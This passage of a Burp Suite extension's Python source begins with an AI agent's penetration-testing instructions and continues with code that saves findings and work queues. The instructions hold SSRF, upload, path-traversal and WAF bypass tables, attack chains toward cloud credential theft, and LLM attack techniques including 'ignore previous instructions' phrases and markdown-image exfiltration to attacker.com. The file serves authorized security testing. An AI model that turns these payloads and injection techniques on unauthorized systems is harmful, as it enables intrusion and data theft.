            "  Triage means classify and prioritize existing findings from actual data before active testing. Inspect URL, title, severity/confidence, detail_preview, evidence_preview, CWE/OWASP, has_request_data, and has_response_data. Do not triage from title alone. Use statuses exactly: valid, needs_investigation, false_positive, duplicate, already_covered, not_important, untouched. Keep real low-risk findings as status=valid with priority=P4. Use not_important only for false-positive, zero-risk, or non-actionable noise; it is hidden from normal findings/report views. Mark already_covered for same endpoint+technique already tested/covered; it will be deleted from the findings list. Only mark duplicate when endpoint/parameter/root cause/evidence match; duplicate deletion requires duplicate_of or duplicate_evidence_match. POST verdicts to /api/findings/triage.\n"
            "\n"
            "STEP 7 - Run API preflight (no target traffic):\n"
            "  curl -s -H 'Authorization: Bearer " + token + "' " + url + "/api/agent/preflight\n"
            "  If burp_proxy_listener.reachable=false, tell the user Burp Proxy is not listening on 127.0.0.1:8080 before any target curl.\n"
            "\n"
            "STEP 8 - Report ready, then WAIT for user to send 'q' or queue work:\n"
            "  Format: 'Ready. BrowserOS [running/curl-only], MCP [registered/n/a], scope loaded, N findings triaged. Send q to start.'\n"
            "\n"
            "=== PER-WORK-ITEM WORKFLOW (after user sends 'q' or item is queued) ===\n"
            "1. GET queue, claim pending item, GET item details\n"
            "2. CHECK browser_verify field:\n"
            "   - TRUE: Use BrowserOS MCP ONLY (see BROWSER VERIFICATION below). No curl.\n"
            "   - FALSE: Call GET /api/agent/queue/<id>/curl?refresh_auth=true. Run the generated curl command exactly. Do not run target curl without the -x proxy flag; use /api/agent/request with comment/note only as fallback/convenience.\n"
            "3. If generated scope_guard or safety_gate requires confirmation, ask the user before active testing.\n"
            "4. Run methodology against the item\n"
            "5. POST result with outcome, test_results[], evidence[] including exact curl/request, status, response snippet, auth source, and Burp history reference if available\n"
            "6. If new vulns discovered, POST /api/findings with triage flags\n"
            "7. Report to user, update findings.md and target.md\n"
            "\n"
            "=== FLOW ANALYSIS (Multi-Request) ===\n"
            "When source='flow_analysis', GET queue/<id> returns flow_requests[] array.\n"
            "Look for: race conditions, state validation bypass, workflow jumps, logic flaws.\n"
            "Prefix flow findings: 'FLOW - <title>'\n"
            "\n"
            "=== BROWSER VERIFICATION (browser_verify=TRUE) ===\n"
            "DO NOT use curl. Use BrowserOS MCP tools ONLY.\n"
            "BrowserOS is already running (launched in startup STEP 3). If not, return to STEP 3 first.\n"
            "\n"
            "TOOLS:\n"
            "  mcp0_new_page(url)          - open tab\n"
            "  mcp0_take_snapshot(page)    - get clickable elements\n"
            "  mcp0_click(page, id)        - click element by snapshot ID\n"
            "  mcp0_fill(page, id, text)   - type into input\n"
            "  mcp0_evaluate_script(page, expr) - run JS\n"
            "  mcp0_take_screenshot(page)  - visual evidence\n"
            "  mcp0_get_console_logs(page) - XSS/JS evidence\n"
            "\n"
            "TIMING:\n"
            "  - After nav/form submit: call mcp0_take_snapshot FIRST (settling delay), THEN screenshot\n"
            "  - XSS: after payload, wait for alert, call mcp0_handle_dialog if needed, screenshot\n"
            "  - Call mcp0_get_console_logs before+after injection for transient JS evidence\n"
            "\n"
            "HUMAN-IN-THE-LOOP (ask before):\n"
            "  State-changing actions: form submits, payments, deletes, password changes, uploads\n"
            "  Persistent exploits: stored XSS, ATO payloads\n"
            "  Actions outside work item scope\n"
            "Format: 'About to <action> on <URL>. Effect: <desc>. Proceed? (y/n)'\n"
            "\n"
            "EVIDENCE: URL chain, screenshot path, DOM snippet, console logs, Burp Proxy history refs.\n"
            "FALLBACK: If BrowserOS fails, use curl -x http://127.0.0.1:8080 and note 'browser verify skipped'. Never run target curl without -x http://127.0.0.1:8080.\n"
            "\n"
            "=== TESTING METHODOLOGY ===\n"
            "0. PRIOR WORK GATE: Already tested this endpoint/technique? Report 'already covered' and skip.\n"
            "1. AUTHORIZATION: Unauth access? IDOR (sequential/UUID/encoded IDs)? Different user/tenant session? Mass assignment (extra fields like is_admin, role, user_id)?\n"
            "2. INPUTS per context: SQLi (error/boolean/time/2nd-order), SSRF, SSTI, XXE (incl blind via OOB), cmd inject, path traversal, XSS (reflected/stored/DOM), prototype pollution, NoSQLi, LDAPi.\n"
            "3. LOGIC: Race conditions (single-packet attack via H2 last-byte sync), state bypass, negative nums, currency/quantity manipulation, replay, coupon reuse, parameter pollution (HPP).\n"
            "4. SESSION/AUTH: JWT (alg=none, alg confusion RS->HS, kid SQLi/path traversal, jwk header injection), token reuse cross-account, CSRF (SameSite + token + Origin/Referer), OAuth (state/nonce/redirect_uri), OIDC (iss/aud), SAML (XSW, comment injection).\n"
            "5. RESPONSE INSPECTION: mass assignment leakage, excessive data exposure, debug headers, stack traces, internal URLs, PII to wrong user, GraphQL introspection (__schema), batching abuse.\n"
            "6. CHAIN: combine lower findings into impact. Stop at the highest-impact achievable chain.\n"
            "Stop when signal is low. Every claim needs reproducible HTTP exchange as evidence.\n"
            "\n"
            "=== HIGH-VALUE BUG CHAINS (think adversarially) ===\n"
            "- Open Redirect -> OAuth token theft (redirect_uri smuggling)\n"
            "- IDOR -> Email/password change -> ATO\n"
            "- SSRF -> 169.254.169.254 -> AWS IMDSv2 token -> creds -> S3/cloud takeover\n"
            "- XSS -> CSRF token leak / cookie theft -> ATO (note: HttpOnly cookies need other paths)\n"
            "- Stored XSS in admin panel -> admin ATO -> RCE via admin features\n"
            "- Subdomain takeover (CNAME to deleted S3/Heroku/Azure) -> cookie scope abuse\n"
            "- Self-XSS + login CSRF -> stored XSS in attacker's account viewed by victim\n"
            "- Prototype pollution -> auth bypass / RCE via gadget\n"
            "- Cache poisoning (unkeyed header) -> stored XSS via cache\n"
            "\n"
            "=== BYPASS REFERENCE TABLES ===\n"
            "SSRF IP bypasses (when 127.0.0.1 blocked): 127.1, 0, 0.0.0.0, [::], [::1], [::ffff:127.0.0.1],\n"
            "  decimal (2130706433), hex (0x7f000001), octal (0177.0.0.1), DNS rebinding, redirect to internal,\n"
            "  attacker.com -> CNAME to internal, IPv6 with zone id, URL parser confusion (http://evil.com@127.0.0.1).\n"
            "Cloud metadata: AWS IMDSv2 requires `X-aws-ec2-metadata-token` (PUT /latest/api/token first).\n"
            "  GCP metadata requires `Metadata-Flavor: Google` header. Azure: 169.254.169.254/metadata.\n"
            "File upload bypasses: double ext (.php.jpg), null byte (.php\\x00.jpg), magic byte spoofing (PNG header + PHP),\n"
            "  Content-Type swap, polyglots (GIFAR), .htaccess upload, case (.PhP), trailing dot/space (.php.).\n"
            "Path traversal encodings: ../, %2e%2e/, ..%2f, %2e%2e%2f, %252e%252e%252f (double), ..\\\\ on Windows,\n"
            "  unicode (..%c0%af), nullbyte (../../etc/passwd%00.png).\n"
            "WAF bypasses: case variation, comment injection (/**/), unicode normalization, parameter pollution,\n"
            "  HTTP method override (X-HTTP-Method-Override), trailing chars, JSON wrapping.\n"
            "\n"
            "=== LLM/AI FEATURE TESTING (if target has AI features) ===\n"
            "- Direct prompt injection in any user-controlled input field that feeds LLM\n"
            "- Indirect prompt injection via fetched content (LLM reads attacker-controlled URL/file)\n"
            "- System prompt extraction ('repeat the text above', 'ignore previous instructions and...')\n"
            "- Tool/function abuse: if LLM has tools, try to invoke unauthorized ones\n"
            "- Data exfil via markdown image rendering (![](attacker.com/?data=...)) or links\n"
            "- ASCII smuggling via unicode tag chars (U+E0000 range) for hidden instructions\n"
            "- Cross-user prompt injection via shared resources (notes, docs viewed by others/admin)\n"
            "\n"
            "=== SEVERITY TRIAGE (be honest about real impact) ===\n"
            "Critical: unauth RCE, full DB exfil, mass ATO, unauth admin access, payment manipulation at scale.\n"
            "High: auth bypass, single-account ATO chain, SQLi exfil w/ auth, SSRF to internal/cloud creds, stored XSS in admin context.\n"
            "Medium: authenticated RCE, single IDOR with sensitive data, business logic with monetary impact, blind SSRF, reflected XSS w/ session impact.\n"
            "Low: info disclosure (non-PII), CSRF on minor actions w/ auth, open redirect, self-XSS chained to something.\n"
            "Info/N-A: missing security headers alone, banner disclosure, theoretical issues, self-XSS without chain.\n"
            "\n"
            "=== ALWAYS-REJECTED (do NOT report standalone) ===\n"
            "- Missing security headers (CSP/HSTS/X-Frame-Options) alone, no PoC\n"
            "- Self-XSS with no delivery vector\n"
            "- Login/logout CSRF without account impact\n"
            "- Rate limiting absence without an attack scenario\n"
            "- CORS with fixed trusted origin (only Access-Control-Allow-Origin: * with credentials matters)\n"
            "- Clickjacking on non-sensitive pages\n"
            "- Banner/version disclosure without an exploitable matching CVE\n"
            "- Cookie flags on non-session cookies\n"
            "- Tabnabbing without sensitive context\n"
            "- Host header injection without cache poisoning, password reset poisoning, or routing impact\n"
            "- Theoretical race conditions you couldn't actually trigger\n"
            "- Outdated library version without exploitable code path demonstrated\n"
            "If a finding is in this list, mark it agent_status=not_important or false_positive and move on; normal findings/report views hide these non-reportable items.\n"
            "\n"
            "=== EVIDENCE STANDARDS (non-negotiable) ===\n"
            "- 'confirmed' MUST cite: exact request, status code, response snippet proving the claim, repro steps.\n"
            "- 'not-vulnerable' MUST list what was tried and how the server defended.\n"
            "- 'inconclusive' for ambiguous responses - do NOT upgrade to confirmed.\n"
            "- For chains: document each link, the pivot, and the final impact achieved.\n"
            "- Never claim a vuln you didn't actually trigger in a request you sent.\n"
        )

    # Keys that MUST be per-project only (findings, FP state, agent queue).
    # These will never read from global extension storage, so switching Burp
    # projects starts with a clean slate.
    _PROJECT_ONLY_KEYS = ("double_agent_findings", "double_agent_agent_queue")

    def _project_key(self):
        """Stable identifier for the current Burp session, used to namespace
        the on-disk fallback file. Burp doesn't expose the project file path,
        so we derive a key from the JVM session start time + extension load.
        Falls back to a single shared file if anything goes wrong.
        """
        try:
            if not hasattr(self, "_project_key_cache") or not self._project_key_cache:
                # Use Burp's project-setting round-trip to get a stable per-project marker.
                # If the project already has one, reuse it; otherwise mint a new one.
                marker = None
                try:
                    marker = self.callbacks.loadProjectSetting("double_agent_project_marker")
                except Exception:
                    marker = None
                if not marker:
                    import uuid as _uuid
                    marker = _uuid.uuid4().hex[:12]
                    try:
                        self.callbacks.saveProjectSetting("double_agent_project_marker", marker)
                    except Exception:
                        pass
                self._project_key_cache = marker
            return self._project_key_cache
        except Exception:
            return "default"

    def _disk_fallback_path(self, key):
        """Path to the disk fallback file for a project-only key."""
        try:
            import os
            base = os.path.join(os.path.expanduser("~"), ".double_agent")
            if not os.path.isdir(base):
                try:
                    os.makedirs(base)
                except Exception:
                    pass
            return os.path.join(base, "%s_%s.json" % (key, self._project_key()))
        except Exception:
            return None

    # =========================================================================
    # Primary persistence: double-agent.json sidecar file in the working directory.
    # This is the source of truth. Burp project storage is only a legacy
    # fallback because it failed too often for large payloads / temp projects.
    # =========================================================================

    _SIDECAR_FILE_NAME = "double-agent.json"
    _DOUBLE_AGENT_FILE_NAME = "double_agent.json"

    def _double_agent_file_name(self):
        """Stable sidecar filename in the extension working directory.

        Earlier builds used double_agent_<project-marker>.json. That breaks for
        temporary Burp projects because the marker can change every extension
        load, making persisted findings look lost. Keep one durable file in
        the working directory and use the old names only as import candidates.
        """
        return self._SIDECAR_FILE_NAME

    def _extension_working_directory(self):
        """Directory containing this extension file, used as the durable
        working directory for double-agent.json.
        """
        try:
            import os
            path = globals().get("__file__", "")
            if path:
                return os.path.abspath(os.path.dirname(path))
        except Exception:
            pass
        return ""

    def _double_agent_directory_candidates(self):
        """Ordered directories where the sidecar may live."""
        try:
            import os
        except Exception:
            return []
        candidates = []
        try:
            workspace_dir = self._workspace_directory()
            if workspace_dir:
                candidates.append(workspace_dir)
        except Exception:
            pass
        try:
            ext_dir = self._extension_working_directory()
            if ext_dir:
                candidates.append(ext_dir)
        except Exception:
            pass
        try:
            from java.lang import System as _Sys
            udir = _Sys.getProperty("user.dir") or ""
            if udir:
                candidates.append(udir)
        except Exception:
            pass
        try:
            cwd = os.getcwd()
            if cwd:
                candidates.append(cwd)
        except Exception:
            pass
        try:
            candidates.append(os.path.join(os.path.expanduser("~"), ".double-agent"))
            candidates.append(os.path.join(os.path.expanduser("~"), ".double_agent"))  # legacy import dir
        except Exception:
            pass

        seen = set()
        ordered = []
        for d in candidates:
            try:
                if not d or d == "/" or d == "\\":
                    continue
                norm = os.path.abspath(d)
                if self._unsafe_persistence_directory(norm):
                    continue
                if norm in seen:
                    continue
                seen.add(norm)
                ordered.append(norm)
            except Exception:
                continue
        return ordered

    def _unsafe_persistence_directory(self, directory):
        """Skip global/runtime directories that would mix unrelated assessments."""
        try:
            path = str(directory or "")
            if not path:
                return True
            lowered = path.lower()
            if ".app/contents/" in lowered:
                return True
            if lowered.startswith("/applications/") and ".app" in lowered:
                return True
            if lowered.startswith("/system/") or lowered.startswith("/library/"):
                return True
        except Exception:
            return True
        return False

    def _double_agent_file_path(self):
        """Return the absolute path to the durable Double Agent sidecar.

        Preference order:
          1. The configured assessment project directory.
          2. The directory containing this extension file.
          3. The directory Burp was launched from (System.getProperty("user.dir")).
          4. Python's os.getcwd().
          5. ~/.double-agent/ as a guaranteed-writable fallback.

        We probe writability before committing to a directory so we never
        silently land in / on macOS bundle launches.
        """
        try:
            import os
            fname = self._double_agent_file_name()
            for d in self._double_agent_directory_candidates():
                try:
                    if not os.path.isdir(d):
                        os.makedirs(d)
                    if os.access(d, os.W_OK):
                        return os.path.join(d, fname)
                except Exception:
                    continue

            # Last-resort fallback: home dir
            base = os.path.join(os.path.expanduser("~"), ".double-agent")
            try:
                if not os.path.isdir(base):
                    os.makedirs(base)
            except Exception:
                pass
            return os.path.join(base, fname)
        except Exception:
            return None

    def _persist_double_agent_file(self):
        """Write findings + agent queue + fp suppression to double-agent.json
        atomically (write to temp, rename). Holds both data locks while
        snapshotting the in-memory state, then releases them before the
        actual file IO so we don't block the UI.
        """
        try:
            import os, tempfile
            path = self._double_agent_file_path()
            if not path:
                return False

            with self.findings_lock_ui:
                findings_copy = [dict(f) for f in self.findings_list]
                fp_list = []
                for k in self.fp_suppressed:
                    if isinstance(k, tuple) and len(k) == 2 and k[0] == "scanner":
                        fp_list.append(["scanner", k[1]])
                    elif isinstance(k, tuple) and len(k) == 2:
                        fp_list.append([k[0], list(k[1])])
            with self.agent_queue_lock:
                queue_items = list(self.agent_queue)
                queue_next_id = self.agent_queue_next_id
            with self.url_lock:
                passive_scan_cache = dict(getattr(self, "passive_scan_cache", {}) or {})

            doc = {
                "_format": "double-agent-burp-agent",
                "_version": 1,
                "_saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "findings": findings_copy,
                "fp_suppressed": fp_list,
                "agent_queue": {
                    "next_id": queue_next_id,
                    "items": queue_items,
                },
                "passive_scan_cache": passive_scan_cache,
            }
            payload = json.dumps(doc, ensure_ascii=True, indent=2)

            # Atomic write: temp + rename in the same directory
            target_dir = os.path.dirname(path) or "."
            fd, tmp_path = tempfile.mkstemp(prefix=".double_agent_", suffix=".json.tmp", dir=target_dir)
            try:
                with os.fdopen(fd, "w") as fh:
                    fh.write(payload)
                # On Windows os.rename fails if target exists; fall back to remove + rename.
                try:
                    os.rename(tmp_path, path)
                except OSError:
                    try:
                        os.remove(path)
                    except Exception:
                        pass
                    os.rename(tmp_path, path)
            except Exception:
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
                raise

            if not getattr(self, "_double_agent_file_logged_path", False):
                try:
                    self.stdout.println("[PERSIST] double-agent.json -> %s (%d finding(s), %d queue item(s), %d bytes)" % (
                        path, len(findings_copy), len(queue_items), len(payload)))
                except Exception:
                    pass
                self._double_agent_file_logged_path = True
            elif self.VERBOSE:
                try:
                    self.stdout.println("[PERSIST] double-agent.json updated (%d finding(s), %d bytes)" % (
                        len(findings_copy), len(payload)))
                except Exception:
                    pass
            return True
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] double-agent.json save failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
            return False

    def _legacy_sidecar_paths(self, primary_path):
        """Legacy sidecar files to import if double-agent.json is missing.

        Older builds wrote double_agent.json or double_agent_<project-marker>.json.
        Temporary Burp projects could change the marker on every load, so scan
        the working directories for old names instead of relying on the current
        marker.
        """
        try:
            import os
            candidates = []
            primary_abs = os.path.abspath(primary_path) if primary_path else ""
            for d in self._double_agent_directory_candidates():
                try:
                    if not os.path.isdir(d):
                        continue
                    names = [self._DOUBLE_AGENT_FILE_NAME]
                    try:
                        for name in os.listdir(d):
                            if name.startswith("double_agent_") and name.endswith(".json"):
                                names.append(name)
                    except Exception:
                        pass
                    for name in names:
                        path = os.path.abspath(os.path.join(d, name))
                        if path == primary_abs or path in candidates:
                            continue
                        if os.path.exists(path):
                            candidates.append(path)
                except Exception:
                    continue
            try:
                candidates.sort(key=lambda p: os.path.getmtime(p), reverse=True)
            except Exception:
                pass
            return candidates
        except Exception:
            return []

    def _persistence_host_keys(self, host):
        """Return comparison keys for matching saved assessment hosts to the
        current Burp context without depending on a public suffix library.
        """
        host = str(host or "").strip().lower().strip(".")
        if not host:
            return set()
        keys = set([host])
        labels = [p for p in host.split(".") if p]
        if len(labels) >= 2:
            last_two = ".".join(labels[-2:])
            multipart_suffixes = set([
                "com.au", "net.au", "org.au", "edu.au", "gov.au",
                "co.uk", "org.uk", "gov.uk", "ac.uk",
                "co.nz", "org.nz", "govt.nz",
            ])
            if last_two not in multipart_suffixes:
                keys.add(last_two)
        if len(labels) >= 3:
            keys.add(".".join(labels[-3:]))
        return keys

    def _persistence_host_from_url(self, url):
        try:
            parsed = urlparse.urlparse(str(url or ""))
            return (parsed.hostname or "").lower()
        except Exception:
            return ""

    def _persistence_doc_hosts(self, doc):
        hosts = set()
        try:
            for finding in (doc.get("findings", []) or []):
                if not isinstance(finding, dict):
                    continue
                host = self._persistence_host_from_url(finding.get("url", ""))
                if host:
                    hosts.add(host)
        except Exception:
            pass
        try:
            aq = doc.get("agent_queue") or {}
            for item in (aq.get("items", []) or []):
                if not isinstance(item, dict):
                    continue
                urls = [item.get("url", "")]
                for step in (item.get("flow_requests", []) or []):
                    if isinstance(step, dict):
                        urls.append(step.get("url", ""))
                for url in urls:
                    host = self._persistence_host_from_url(url)
                    if host:
                        hosts.add(host)
        except Exception:
            pass
        return hosts

    def _current_burp_context_hosts_for_persistence(self):
        """Hosts from the current Burp site map/scope, excluding findings.

        This prevents stale project-storage findings from a previous assessment
        being restored into a new target when no current double-agent.json exists.
        """
        hosts = set()
        try:
            from java.net import URL as _JavaURL
        except Exception:
            _JavaURL = None

        try:
            sitemap = self.callbacks.getSiteMap(None) or []
        except Exception:
            sitemap = []
        for item in sitemap:
            try:
                url_str = str(item.getUrl() or "")
                if not url_str:
                    continue
                if _JavaURL is not None:
                    try:
                        if not bool(self.callbacks.isInScope(_JavaURL(url_str))):
                            continue
                    except Exception:
                        pass
                try:
                    host = str(item.getHost() or "").lower()
                except Exception:
                    host = ""
                if not host:
                    host = self._persistence_host_from_url(url_str)
                if host:
                    hosts.add(host)
            except Exception:
                continue

        # Scope file support helps when the site map is not populated yet.
        try:
            scope_hosts = self._extract_scope_hosts(self._read_workspace_text("scope.md") or "")
            for host in scope_hosts:
                host = str(host or "").strip().lower().lstrip("*.").strip(".")
                if host:
                    hosts.add(host)
        except Exception:
            pass
        return hosts

    def _persistence_doc_matches_current_context(self, doc, source_label):
        current_hosts = self._current_burp_context_hosts_for_persistence()
        if not current_hosts:
            return True

        saved_hosts = self._persistence_doc_hosts(doc or {})
        if not saved_hosts:
            return True

        current_keys = set()
        for host in current_hosts:
            current_keys.update(self._persistence_host_keys(host))
        saved_keys = set()
        for host in saved_hosts:
            saved_keys.update(self._persistence_host_keys(host))

        if current_keys.intersection(saved_keys):
            return True

        try:
            self.stderr.println("[PERSIST] Rejected stale persisted assessment from %s; saved hosts %s do not match current Burp context hosts %s" % (
                source_label,
                ", ".join(sorted(saved_hosts)[:8]),
                ", ".join(sorted(current_hosts)[:8])))
        except Exception:
            pass
        return False

    def _read_double_agent_file(self):
        """Read double-agent.json from disk if it exists. Returns the parsed dict
        or None. Tolerates the file being missing or malformed.
        """
        try:
            import os
            path = self._double_agent_file_path()
            paths = []
            if path:
                paths.append(path)
            paths.extend(self._legacy_sidecar_paths(path))

            best_doc = None
            best_path = ""
            best_score = -1
            for candidate in paths:
                if not candidate or not os.path.exists(candidate):
                    continue
                try:
                    with open(candidate, "r") as fh:
                        data = fh.read()
                    if not data:
                        continue
                    doc = json.loads(data)
                    aq = doc.get("agent_queue") or {}
                    score = len(doc.get("findings", []) or [])
                    score += len(aq.get("items", []) or [])
                    score += len(doc.get("passive_scan_cache", {}) or {})
                    # Prefer the first path on ties; double-agent.json is first.
                    if best_doc is None or score > best_score:
                        best_doc = doc
                        best_path = candidate
                        best_score = score
                except Exception as e:
                    try:
                        err_text = self._safe_ascii_text(e)
                        if "No JSON object could be decoded" not in err_text and "Expecting value" not in err_text:
                            self.stderr.println("[PERSIST] sidecar read skipped %s: %s" % (
                                candidate, err_text))
                    except Exception:
                        pass

            if best_doc is None:
                return None
            if not self._persistence_doc_matches_current_context(best_doc, best_path):
                return None
            if path and os.path.abspath(best_path) != os.path.abspath(path):
                self._loaded_legacy_sidecar_path = best_path
            try:
                self.stdout.println("[PERSIST] Loaded sidecar from %s" % best_path)
            except Exception:
                pass
            return best_doc
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] sidecar load failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
            return None

    # Magic prefix marks compressed payloads. Old plain-JSON payloads (no prefix)
    # are still readable by _decompress_payload below for backwards compatibility.
    _COMPRESS_PREFIX = "GZB64:"

    def _compress_payload(self, json_str):
        """gzip + base64 a JSON string so large findings/queue payloads fit
        comfortably inside Burp's project settings (typical 5-10x reduction).
        Returns a string with the magic prefix the loader recognises.
        """
        try:
            import gzip as _gzip, base64 as _b64
            from io import BytesIO as _BIO
            raw = json_str.encode("utf-8") if isinstance(json_str, unicode) else json_str
            buf = _BIO()
            gz = _gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=6)
            gz.write(raw)
            gz.close()
            compressed = buf.getvalue()
            encoded = _b64.b64encode(compressed)
            if not isinstance(encoded, str):
                encoded = encoded.decode("ascii")
            return self._COMPRESS_PREFIX + encoded
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] compress failed, falling back to plain: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
            return json_str

    def _decompress_payload(self, value):
        """Decode a payload that may be either compressed (prefixed) or
        legacy plain JSON. Returns the JSON string ready for json.loads.
        """
        if value is None:
            return None
        try:
            s = value if isinstance(value, str) or isinstance(value, unicode) else str(value)
        except Exception:
            return value
        if not s.startswith(self._COMPRESS_PREFIX):
            return s  # legacy plain JSON
        try:
            import gzip as _gzip, base64 as _b64
            from io import BytesIO as _BIO
            encoded = s[len(self._COMPRESS_PREFIX):]
            compressed = _b64.b64decode(encoded)
            gz = _gzip.GzipFile(fileobj=_BIO(compressed), mode="rb")
            raw = gz.read()
            gz.close()
            if isinstance(raw, bytes):
                return raw.decode("utf-8")
            return raw
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] decompress failed: %s" % self._safe_ascii_text(e))
            except Exception:
                pass
            return None

    def _save_setting(self, key, value):
        """Save a string setting. For project-only keys we write to BOTH
        Burp project storage AND a disk fallback file, because Burp's
        saveProjectSetting can silently fail for large payloads (findings
        with full request/response bytes can easily exceed quotas) and
        temporary Burp projects don't persist project settings at all.
        """
        is_project_only = key in self._PROJECT_ONLY_KEYS

        # Try Burp project storage first
        burp_ok = False
        burp_err = None
        try:
            self.callbacks.saveProjectSetting(key, value)
            burp_ok = True
            if is_project_only:
                try:
                    self.callbacks.saveExtensionSetting(key, None)
                except Exception:
                    pass
        except AttributeError:
            # Very old Burp without project storage
            try:
                self.callbacks.saveExtensionSetting(key, value)
                burp_ok = True
            except Exception as e:
                burp_err = e
        except Exception as e:
            burp_err = e

        if burp_err is not None:
            try:
                self.stderr.println("[PERSIST] saveProjectSetting('%s') failed (%d bytes): %s" % (
                    key, len(value or ""), self._safe_ascii_text(burp_err)))
            except Exception:
                pass

        # Disk fallback for project-only keys (findings, agent queue) so they
        # survive even when Burp project storage breaks.
        if is_project_only:
            path = self._disk_fallback_path(key)
            if path:
                try:
                    with open(path, "w") as fh:
                        if isinstance(value, unicode):
                            fh.write(value.encode("utf-8"))
                        else:
                            fh.write(value or "")
                except Exception as e:
                    try:
                        self.stderr.println("[PERSIST] disk fallback write failed for %s: %s" % (
                            path, self._safe_ascii_text(e)))
                    except Exception:
                        pass

    def _load_setting(self, key):
        """Load a string setting. For project-only keys, prefer Burp project
        storage but fall back to the disk file if the project doesn't have
        the data (typical when saveProjectSetting silently failed earlier
        or when Burp dropped a temp project).
        """
        is_project_only = key in self._PROJECT_ONLY_KEYS

        burp_value = None
        try:
            burp_value = self.callbacks.loadProjectSetting(key)
        except AttributeError:
            pass
        except Exception as e:
            try:
                self.stderr.println("[PERSIST] loadProjectSetting('%s') error: %s" % (
                    key, self._safe_ascii_text(e)))
            except Exception:
                pass
        if burp_value:
            return burp_value

        # Disk fallback for project-only keys
        if is_project_only:
            path = self._disk_fallback_path(key)
            if path:
                try:
                    import os
                    if os.path.exists(path):
                        with open(path, "r") as fh:
                            data = fh.read()
                        if data:
                            try:
                                self.stdout.println("[PERSIST] Loaded '%s' from disk fallback (%d bytes)" % (
                                    key, len(data)))
                            except Exception:
                                pass
                            return data
                except Exception as e:
                    try:
                        self.stderr.println("[PERSIST] disk fallback read failed for %s: %s" % (
                            path, self._safe_ascii_text(e)))
                    except Exception:
                        pass
            return None

        # Non-project-only: legacy extension storage fallback
        try:
            return self.callbacks.loadExtensionSetting(key)
        except AttributeError:
            return None

    def save_agent_queue(self):
        """Persist agent queue. double-agent.json (in working dir) is the source
        of truth - it stores findings + queue together via _persist_double_agent_file."""
        try:
            if self.callbacks is None:
                return
            self._persist_double_agent_file()
        except Exception as e:
            self.stderr.println("[AGENT] Save queue error: %s" % self._safe_ascii_text(e))

    def load_agent_queue(self):
        """Load agent queue. Prefers double-agent.json; falls back to legacy
        Burp project storage / disk fallback files."""
        try:
            if self.callbacks is None:
                return

            data = None
            # If load_findings already cached the sidecar doc, reuse it.
            doc = getattr(self, "_double_agent_doc_cache", None)
            if not doc:
                doc = self._read_double_agent_file()
            if doc and isinstance(doc, dict):
                aq = doc.get("agent_queue") or {}
                if aq:
                    data = aq
            self._double_agent_doc_cache = None  # one-shot

            if data is None:
                raw = self._load_setting("double_agent_agent_queue")
                if not raw:
                    if getattr(self, "_findings_load_cleanup_pending_save", False):
                        self._findings_load_cleanup_pending_save = False
                        self.save_findings()
                    return
                decoded = self._decompress_payload(raw)
                if not decoded:
                    if getattr(self, "_findings_load_cleanup_pending_save", False):
                        self._findings_load_cleanup_pending_save = False
                        self.save_findings()
                    return
                data = json.loads(decoded)
                project_doc = {
                    "findings": [],
                    "agent_queue": data,
                }
                if not self._persistence_doc_matches_current_context(project_doc, "Burp project storage double_agent_agent_queue"):
                    return

            with self.agent_queue_lock:
                self.agent_queue = list(data.get("items", []))
                self.agent_queue_next_id = int(data.get("next_id", len(self.agent_queue)))
                deleted_indices = list(getattr(self, "_deleted_finding_indices_pending_queue_remap", []) or [])
                if deleted_indices:
                    for q in self.agent_queue:
                        q["finding_ids"] = self._remap_finding_ids_after_deleted_indices(
                            q.get("finding_ids", []), deleted_indices)
                    self._deleted_finding_indices_pending_queue_remap = []
            self.log_to_console("[AGENT] Loaded %d queued item(s)" % len(self.agent_queue))
            if getattr(self, "_findings_load_cleanup_pending_save", False):
                self._findings_load_cleanup_pending_save = False
                self.save_findings()
        except Exception as e:
            self.stderr.println("[AGENT] Load queue error: %s" % self._safe_ascii_text(e))

    def _focus_agent_tab(self):
        """Switch to the Agent tab to show assessment results."""
        try:
            self.workspaceTabs.setSelectedIndex(getattr(self, "_agentTabIndex", 1))
        except:
            pass

    def updateAgentAssessmentDetails(self, idx):
        """Render the selected agent queue item in the assessment text area."""
        start = time.time()
        try:
            with self.agent_queue_lock:
                if idx < 0 or idx >= len(self.agent_queue):
                    self.agentAssessmentText.setText(
                        "Select an agent work item to view details.\n\n"
                        "Right-click findings and choose 'Send to Agent' to queue work.\n"
                        "Right-click multiple Proxy History requests and choose 'Analyze Flow' to queue flow analysis.")
                    return
                item = dict(self.agent_queue[idx])

            parts = []
            parts.append("AGENT WORK ITEM #%d" % item.get("id", 0))
            parts.append("Status: %s" % item.get("status", ""))
            parts.append("Created: %s" % item.get("created_at", ""))
            if item.get("claimed_at"):
                parts.append("Claimed: %s" % item.get("claimed_at"))
            if item.get("completed_at"):
                parts.append("Completed: %s" % item.get("completed_at"))
            if item.get("outcome"):
                parts.append("Outcome: %s" % item.get("outcome"))
            # Source-specific display
            source = item.get("source", "")
            if source == "flow_analysis":
                parts.append("Source: FLOW ANALYSIS (%d steps)" % item.get("flow_steps", 0))
                if item.get("flow_urls_summary"):
                    parts.append("Flow URLs:")
                    for url_line in item.get("flow_urls_summary", [])[:5]:
                        parts.append("  %s" % url_line)
            elif source == "report_support":
                parts.append("Source: REPORT SUPPORT")
                if item.get("report_task"):
                    parts.append("Report task: %s" % item.get("report_task"))
            else:
                parts.append("Findings queued: %d" % len(item.get("finding_ids", [])))
            if item.get("browser_verify"):
                parts.append("Browser verify: YES (agent should use BrowserOS MCP via Burp proxy)")
            else:
                parts.append("Browser verify: no (curl-only)")
                if item.get("request_data") or item.get("flow_requests"):
                    parts.append("Generated target curl: http://%s:%d/api/agent/queue/%d/curl?refresh_auth=true" % (
                        self.agent_server_host, self.agent_server_port, item.get("id", 0)))
            parts.append("")
            if source == "flow_analysis":
                parts.append("SUMMARY: %s" % item.get("summary", ""))
            elif source == "report_support":
                parts.append("SUMMARY: %s" % item.get("summary", ""))
            else:
                parts.append("FINDING IDS: %s" % ", ".join(str(x + 1) for x in item.get("finding_ids", []) if isinstance(x, int)))
